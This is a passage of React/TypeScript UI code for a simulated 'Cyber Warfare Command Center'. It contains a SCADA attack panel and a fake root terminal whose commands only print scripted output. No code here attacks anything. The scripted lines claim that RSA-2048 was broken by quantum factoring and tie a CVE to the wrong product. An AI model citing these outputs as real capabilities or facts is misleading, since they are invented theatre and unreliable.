    setSelected(null);
    setProgress(0);
    setLog([]);
    setSystems(SCADA_SYSTEMS.map(s => ({ ...s })));
  };

  return (
    <div className="flex gap-3 h-full">
      <div className="flex-1 flex flex-col gap-2">
        <div className="grid grid-cols-2 gap-2">
          {systems.map((s) => {
            const Icon = s.icon;
            const col = s.status === "compromised" ? "#e21227" : s.status === "attacking" ? "#ff6600" : s.status === "scanning" ? "#fbbf24" : "#4ade80";
            return (
              <button key={s.id} onClick={() => attack(s.id)} disabled={running && selected !== s.id}
                className="rounded-xl border p-3 text-left transition-all hover:scale-[1.02] disabled:opacity-60 disabled:cursor-not-allowed"
                style={{ borderColor: col + "44", background: s.id === selected ? col + "11" : "#0d0d0d" }}>
                <div className="flex items-center gap-2 mb-1">
                  <div className="w-6 h-6 rounded-full flex items-center justify-center" style={{ background: col + "22" }}>
                    <Icon className="w-3 h-3" style={{ color: col }} />
                  </div>
                  <span className="text-[10px] font-bold" style={{ color: col }}>{s.name}</span>
                </div>
                <div className="text-[9px] font-mono text-zinc-600">{s.desc}</div>
                <div className="flex items-center gap-1 mt-1.5">
                  <div className="h-1 w-1 rounded-full animate-pulse" style={{ background: col }} />
                  <span className="text-[9px] font-mono" style={{ color: col }}>{s.status.toUpperCase()}</span>
                  <span className="ml-auto text-[9px] font-mono text-zinc-700">{s.proto}</span>
                </div>
              </button>
            );
          })}
        </div>
        {selected && (
          <div className="rounded-xl border border-[#1f1f1f] bg-[#0d0d0d] p-3">
            <div className="flex justify-between mb-1">
              <span className="text-[9px] font-mono text-zinc-600">INFILTRATION PROGRESS</span>
              <span className="text-[10px] font-mono text-[#e21227]">{progress.toFixed(1)}%</span>
            </div>
            <div className="h-2 rounded-full bg-[#1f1f1f] overflow-hidden">
              <motion.div className="h-full rounded-full" style={{ background: "linear-gradient(90deg,#fbbf24,#e21227)" }} animate={{ width: `${progress}%` }} />
            </div>
          </div>
        )}
        <button onClick={reset} className="flex items-center justify-center gap-2 py-2 rounded-lg text-xs font-mono text-zinc-500 border border-[#1f1f1f] hover:border-[#333] transition-all">
          <RotateCcw className="w-3 h-3" /> RESET ALL SYSTEMS
        </button>
      </div>
      <div className="w-60 flex flex-col gap-2">
        <span className="text-[10px] font-mono text-[#fbbf24] px-1">ICS ATTACK LOG</span>
        <div className="flex-1 rounded-lg border border-[#1f1f1f] bg-[#0a0a0a] p-2 overflow-auto">
          {log.map((l, i) => (
            <div key={i} className="text-[10px] font-mono py-0.5" style={{ color: l.includes("BREACH") || l.includes("IMPACT") ? "#e21227" : l.includes("CTRL") ? "#fbbf24" : l.includes("VULN") ? "#ff6600" : "#52525b" }}>{l}</div>
          ))}
          {running && <div className="text-[10px] font-mono text-orange-500 animate-pulse">▌</div>}
          {!log.length && <div className="text-[10px] font-mono text-zinc-700">Select a target system to begin infiltration...</div>}
        </div>
      </div>
    </div>
  );
}

// ─── TAB 6 · Live Military Terminal ──────────────────────────────────────────
const TERMINAL_PAYLOADS = [
  { cmd: "poly-compile --target x64 --obfuscate heavy --junk 30%", output: ["[*] Loading polymorphic core engine...", "[*] Applying variable mutation (seed: 0xDEADBEEF)", "[*] Inserting 847 junk instructions...", "[+] Hash: a3f7c2...e84f06 → UNIQUE SIGNATURE CONFIRMED", "[+] Output: payload_0x7f2a.bin (47.3KB)  ✓"] },
  { cmd: "swarm-deploy --agents 4 --target 10.0.0.1 --mode parallel", output: ["[*] Initializing mesh C2 network...", "[*] Agent ALPHA: DDoS module loaded (847K pps)", "[*] Agent BETA: Zero-day exploit chain ready", "[*] Agent GAMMA: Exfil tunnel via DNS covert channel", "[*] Agent DELTA: Anti-forensics module armed", "[+] SWARM DEPLOYED — 4/4 agents active  ✓"] },
  { cmd: "quantum-crack --algo RSA-2048 --qubits 4096 --method shor", output: ["[*] Allocating 4096 logical qubits...", "[*] Building Shor's circuit for N=2^2048...", "[*] Quantum Fourier Transform: depth=14,729...", "[*] Period finding: r=104857600...", "[+] FACTORS FOUND: p=0x9F3...  q=0xC7A...", "[+] PRIVATE KEY RECOVERED  ✓"] },
  { cmd: "scada-pwn --proto modbus --target 192.168.100.5 --cmd inject", output: ["[*] Scanning Modbus TCP port 502...", "[*] PLC firmware: Siemens S7-300 v3.2.1", "[*] CVE-2024-3094: Applying buffer overflow...", "[*] Pivoting to engineering workstation...", "[*] HMI write access granted", "[+] PHYSICAL PROCESS CONTROL ACTIVE  ✓"] },
];

function LiveTerminal() {
  const [lines, setLines] = useState<{ text: string; type: "cmd"|"out"|"err"|"sys" }[]>([
    { text: "CYBER WARFARE TERMINAL v3.0 — INITIALIZED", type: "sys" },
    { text: "SWARM AGENTS: DEPLOYED  |  QUANTUM ENGINE: ONLINE  |  POLYMORPHIC CORE: HOT", type: "sys" },
    { text: "Type 'help' for command list or select a quick payload below", type: "sys" },
    { text: "", type: "out" },
  ]);
  const [input, setInput] = useState("");
  const [typing, setTyping] = useState(false);
  const endRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: "smooth" }); }, [lines]);

  const execPayload = (idx: number) => {
    if (typing) return;
    const p = TERMINAL_PAYLOADS[idx];
    setTyping(true);
    setLines(l => [...l, { text: `root@mr7-kaligpt:~# ${p.cmd}`, type: "cmd" }]);
    let i = 0;
    const iv = setInterval(() => {
      if (i >= p.output.length) { clearInterval(iv); setTyping(false); setLines(l => [...l, { text: "", type: "out" }]); return; }
      const line = p.output[i];
      setLines(l => [...l, { text: line, type: line.startsWith("[+]") ? "sys" : "out" }]);
      i++;
    }, 200);
  };

  const handleEnter = () => {
    if (!input.trim() || typing) return;
    const cmd = input.trim().toLowerCase();
    setLines(l => [...l, { text: `root@mr7-kaligpt:~# ${input}`, type: "cmd" }]);
    setInput("");
    if (cmd === "help") {
      setLines(l => [...l,
        { text: "Available commands:", type: "out" },
        { text: "  poly-compile    — polymorphic payload generator", type: "out" },
        { text: "  swarm-deploy    — launch AI swarm attack", type: "out" },
        { text: "  quantum-crack   — quantum cryptanalysis", type: "out" },
        { text: "  scada-pwn       — ICS/SCADA infiltration", type: "out" },
        { text: "  clear           — clear terminal", type: "out" },
        { text: "", type: "out" },
      ]);
    } else if (cmd === "clear") {
      setLines([{ text: "TERMINAL CLEARED", type: "sys" }, { text: "", type: "out" }]);
    } else {
      const found = TERMINAL_PAYLOADS.findIndex(p => cmd.startsWith(p.cmd.split(" ")[0]));
      if (found >= 0) {
        execPayload(found);
      } else {
        setLines(l => [...l, { text: `bash: ${cmd}: command not found`, type: "err" }, { text: "", type: "out" }]);
      }
    }
  };

  return (
    <div className="flex flex-col gap-2 h-full">
      <div className="flex gap-2 flex-wrap">
        {TERMINAL_PAYLOADS.map((p, i) => (
          <button key={i} onClick={() => execPayload(i)} disabled={typing}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[10px] font-mono font-bold transition-all hover:scale-105 disabled:opacity-50"
            style={{ background: "rgba(226,18,39,0.12)", border: "1px solid rgba(226,18,39,0.3)", color: "#e21227" }}>
            <ChevronRight className="w-3 h-3" />
            {p.cmd.split(" ")[0]}
          </button>
        ))}
      </div>
      <div
        className="flex-1 rounded-xl border border-[#1f1f1f] bg-[#020202] p-3 overflow-auto cursor-text"
        style={{ fontFamily: "monospace", minHeight: 300 }}
        onClick={() => inputRef.current?.focus()}
      >
        {lines.map((l, i) => (
          <div key={i} className="text-[11px] leading-relaxed whitespace-pre-wrap"
            style={{ color: l.type === "cmd" ? "#4ade80" : l.type === "sys" ? "#fbbf24" : l.type === "err" ? "#e21227" : "#94a3b8" }}>
            {l.text}
          </div>
        ))}
        <div className="flex items-center gap-2 mt-1">
          <span className="text-[11px] font-mono text-green-400">root@mr7-kaligpt:~# </span>
          <input
            ref={inputRef}
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => { if (e.key === "Enter") handleEnter(); }}
            className="flex-1 bg-transparent text-[11px] font-mono text-green-300 outline-none caret-green-400"
            disabled={typing}
            autoFocus
            spellCheck={false}
          />
          {typing && <span className="text-[11px] text-green-400 animate-pulse">▌</span>}
        </div>
        <div ref={endRef} />
      </div>
    </div>
  );
}

// ─── MAIN MODAL ───────────────────────────────────────────────────────────────
const TABS: { id: Tab; label: string; icon: typeof Shield; color: string }[] = [
  { id: "matrix3d", label: "MATRIX 3D", icon: Network, color: "#00e5ff" },
  { id: "polymorphic", label: "POLYMORPHIC", icon: Binary, color: "#4ade80" },
  { id: "swarm", label: "SWARM", icon: BrainCircuit, color: "#e21227" },
  { id: "quantum", label: "QUANTUM", icon: Atom, color: "#a78bfa" },
  { id: "scada", label: "SCADA/ICS", icon: Layers, color: "#fbbf24" },
  { id: "terminal", label: "TERMINAL", icon: Terminal, color: "#ff6600" },
];

export function CyberWarfareMatrixModal({ open, onOpenChange }: Props) {
  const [tab, setTab] = useState<Tab>("matrix3d");
  const [bootLines, setBootLines] = useState<string[]>([]);
  const [booted, setBooted] = useState(false);

  useEffect(() => {
    if (!open) { setBooted(false); setBootLines([]); return; }
    const msgs = [
      "CYBER WARFARE COMMAND CENTER v4.0",
      "Initializing polymorphic engine core...",
      "Loading quantum cryptanalysis framework...",
      "Deploying swarm intelligence mesh...",
      "Connecting to ICS/SCADA sensor grid...",
      "Calibrating 3D network topology matrix...",
      "All systems nominal. Standing by.",
    ];
    let i = 0;
    const iv = setInterval(() => {
      if (i >= msgs.length) { clearInterval(iv); setTimeout(() => setBooted(true), 400); return; }
      setBootLines(p => [...p, msgs[i++]]);
    }, 180);
    return () => clearInterval(iv);
  }, [open]);

  if (!open) return null;

  return (
    <AnimatePresence>
      <motion.div
        className="fixed inset-0 z-50 flex items-center justify-center p-4"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        style={{ background: "rgba(0,0,0,0.92)", backdropFilter: "blur(16px)" }}
        onClick={(e) => { if (e.target === e.currentTarget) onOpenChange(false); }}
      >
        <motion.div
          className="relative w-full flex flex-col overflow-hidden"
          initial={{ scale: 0.92, opacity: 0, y: 30 }}
          animate={{ scale: 1, opacity: 1, y: 0 }}
          exit={{ scale: 0.92, opacity: 0 }}
          transition={{ type: "spring", stiffness: 300, damping: 28 }}
          style={{
            maxWidth: 1100,
            maxHeight: "93vh",
            background: "linear-gradient(135deg, #0a0a0a 0%, #0d0d0d 50%, #080808 100%)",
            border: "1px solid rgba(226,18,39,0.35)",
            boxShadow: "0 0 80px rgba(226,18,39,0.15), 0 0 160px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.03)",
            borderRadius: 16,
          }}
        >
          {/* Scan line effect */}
          <div className="pointer-events-none absolute inset-0 overflow-hidden rounded-[18px]">
            <motion.div
              className="absolute left-0 right-0 h-px"
              style={{ background: "linear-gradient(90deg,transparent,rgba(226,18,39,0.4),transparent)" }}
              animate={{ top: ["0%", "100%"] }}
              transition={{ duration: 4, repeat: Infinity, ease: "linear" }}
            />
          </div>

          {/* Header */}
          <div className="flex items-center gap-3 px-4 pt-3 pb-[10px] border-b border-[#1f1f1f] flex-shrink-0">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 rounded-lg flex items-center justify-center" style={{ background: "rgba(226,18,39,0.15)", border: "1px solid rgba(226,18,39,0.35)" }}>
                <Crosshair className="w-4 h-4 text-[#e21227]" />
              </div>
              <div>
                <div className="text-sm font-black text-white tracking-widest">CYBER WARFARE COMMAND CENTER</div>
                <div className="text-[9px] font-mono text-zinc-600 tracking-[0.2em]">POLYMORPHIC · SWARM · QUANTUM · SCADA · 3D MATRIX</div>
              </div>
            </div>
            {/* Status indicators */}
            <div className="ml-auto flex items-center gap-3 mr-3">
              {[{ label: "ENGINE", color: "#4ade80" }, { label: "SWARM", color: "#e21227" }, { label: "QUANTUM", color: "#a78bfa" }, { label: "ICS", color: "#fbbf24" }].map(s => (
                <div key={s.label} className="flex items-center gap-1">
                  <div className="w-1.5 h-1.5 rounded-full animate-pulse" style={{ background: s.color }} />
                  <span className="text-[9px] font-mono text-zinc-600">{s.label}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => onOpenChange(false)}
              className="w-7 h-7 flex items-center justify-center rounded-lg transition-all hover:scale-110"
              style={{ color: "#e21227", background: "rgba(226,18,39,0.1)", border: "1px solid rgba(226,18,39,0.2)" }}
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {/* Boot sequence */}
          <AnimatePresence>
            {!booted && (
              <motion.div
                className="absolute inset-0 z-10 flex flex-col items-center justify-center gap-2 rounded-[18px]"
                style={{ background: "#080808" }}
                exit={{ opacity: 0 }}
                transition={{ duration: 0.4 }}
              >
                <div className="mb-4">
                  <motion.div
                    className="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4"
                    style={{ border: "1px solid rgba(226,18,39,0.5)", background: "rgba(226,18,39,0.08)" }}
                    animate={{ boxShadow: ["0 0 20px rgba(226,18,39,0.3)", "0 0 50px rgba(226,18,39,0.6)", "0 0 20px rgba(226,18,39,0.3)"] }}
                    transition={{ duration: 1.5, repeat: Infinity }}
                  >
                    <Skull className="w-8 h-8 text-[#e21227]" />
                  </motion.div>
                </div>
                {bootLines.map((l, i) => (
                  <motion.div key={i} initial={{ x: -20, opacity: 0 }} animate={{ x: 0, opacity: 1 }}
                    className="text-[11px] font-mono"
                    style={{ color: i === 0 ? "#e21227" : i === bootLines.length - 1 ? "#4ade80" : "#52525b" }}>
                    {i > 0 && i < bootLines.length - 1 && <span className="mr-2 text-zinc-700">[{String(i).padStart(2,"0")}]</span>}
                    {l}
                  </motion.div>
                ))}
                {bootLines.length < 7 && <div className="text-[11px] font-mono text-[#e21227] animate-pulse mt-2">▌</div>}
              </motion.div>
            )}
          </AnimatePresence>

          {/* Tabs */}
          <div className="flex gap-1 px-4 pt-3 pb-2 border-b border-[#1f1f1f] flex-shrink-0 overflow-x-auto">
            {TABS.map(({ id, label, icon: Icon, color }) => (
              <button
                key={id}
                onClick={() => setTab(id)}
                className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[10px] font-bold tracking-wider transition-all hover:scale-105 whitespace-nowrap"
                style={{
                  background: tab === id ? color + "15" : "transparent",
                  border: `1px solid ${tab === id ? color + "50" : "#1f1f1f"}`,
                  color: tab === id ? color : "#52525b",
                }}
              >
                <Icon className="w-3 h-3" />
                {label}
              </button>
            ))}
          </div>

          {/* Content */}
          <div className="flex-1 overflow-auto p-4">
            <AnimatePresence mode="wait">
              <motion.div key={tab} initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} transition={{ duration: 0.2 }} className="h-full">
                {tab === "matrix3d" && (
                  <div className="flex flex-col gap-3">
                    <MatrixCanvas />
                    <div className="grid grid-cols-4 gap-2">
                      {[
                        { label: "Nodes Online", value: "12", color: "#00e5ff" },
                        { label: "Compromised", value: "0", color: "#e21227" },
                        { label: "Attack Streams", value: "∞", color: "#fbbf24" },
                        { label: "Coverage", value: "100%", color: "#4ade80" },
                      ].map(s => (
                        <div key={s.label} className="rounded-xl border border-[#1f1f1f] bg-[#0d0d0d] px-3 py-2 text-center">
                          <div className="text-lg font-black" style={{ color: s.color }}>{s.value}</div>
                          <div className="text-[9px] font-mono text-zinc-600">{s.label}</div>
                        </div>
                      ))}
                    </div>
                    <div className="grid grid-cols-3 gap-2">
                      {[
                        { label: "NODE TYPE", items: ["server → CORE-SRV", "firewall → FW-GATE", "db → DB-MAIN"] },
                        { label: "PROTOCOLS", items: ["TCP/IP · SMB · RDP", "DNS · HTTP · HTTPS", "LDAP · WinRM · SSH"] },
                        { label: "ATTACK VECTORS", items: ["RCE → Particle stream", "Privesc → Node turns red", "Exfil → Data particles"] },
                      ].map(s => (
                        <div key={s.label} className="rounded-xl border border-[#1f1f1f] bg-[#0d0d0d] px-3 py-2">
                          <div className="text-[9px] font-mono text-zinc-600 mb-1">{s.label}</div>
                          {s.items.map(i => <div key={i} className="text-[10px] font-mono text-zinc-400">{i}</div>)}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
                {tab === "polymorphic" && <PolymorphicEngine />}
                {tab === "swarm" && <SwarmAgents />}
                {tab === "quantum" && <QuantumCrypto />}
                {tab === "scada" && <ScadaInfiltration />}
                {tab === "terminal" && <LiveTerminal />}
              </motion.div>
            </AnimatePresence>
          </div>

          {/* Footer */}
          <div className="px-4 py-2 border-t border-[#1f1f1f] flex items-center gap-3 flex-shrink-0">
            <Lock className="w-3 h-3 text-zinc-700" />
            <span className="text-[9px] font-mono text-zinc-700">SIMULATION MODE — ALL OPERATIONS ARE VIRTUALIZED — NO REAL SYSTEMS ARE AFFECTED</span>
            <div className="ml-auto flex items-center gap-2">
              <div className="h-1 w-1 rounded-full bg-green-500 animate-pulse" />
              <span className="text-[9px] font-mono text-zinc-700">SANDBOXED · gVisor v2.0</span>
            </div>
          </div>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}
